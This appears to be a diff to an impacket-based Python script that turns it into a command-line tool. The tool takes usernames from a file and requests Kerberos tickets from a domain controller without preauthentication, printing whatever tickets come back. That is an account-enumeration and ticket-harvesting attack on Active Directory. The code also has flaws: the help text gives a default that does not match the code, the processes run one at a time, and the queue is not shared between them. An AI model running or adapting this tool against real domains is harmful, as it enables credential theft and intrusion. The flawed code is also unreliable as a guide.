@@ -1,6 +1,6 @@
 from queue import Queue
 import time as t
-from multiprocessing.dummy import Pool as ThreadPool
+from multiprocessing import Process
 import argparse
 from impacket import version
 from impacket.examples import logger
@@ -39,3 +39,38 @@ def get_user(user, domain, dc):
     TS = TGS(tgt, domain, cipher, old, new, user, dc, preauth=False)
     tgs = TS.run()
     return tgs
+
+
+
+def run(domain, dc, delay):
+    while not q.empty():
+        user = q.get()
+        try:
+            tgs = get_user(user,domain,dc)
+            print(tgs)
+        except Exception as e:
+            print(e)
+        finally:
+            t.sleep(delay)
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-user_file', help="the user file for user to be enumerated")
+    parser.add_argument('-domain', help='the target domain')
+    parser.add_argument('-dc', help='the domain controller')
+    parser.add_argument('-processes', default=1, help='the number of processes, defailt is 3', type=int)
+    parser.add_argument('-delay', help='add a delay in between requests', default=0.1, type=float)
+
+    options = parser.parse_args()
+    f = options.user_file
+    domain = options.domain
+    dc = options.dc
+    delay = options.delay
+    q = build_queue(f)
+    processes = options.processes
+
+    for process in range(processes):
+        p = Process(target=run, args=(domain, dc, delay,))
+        p.start()
+        p.join()
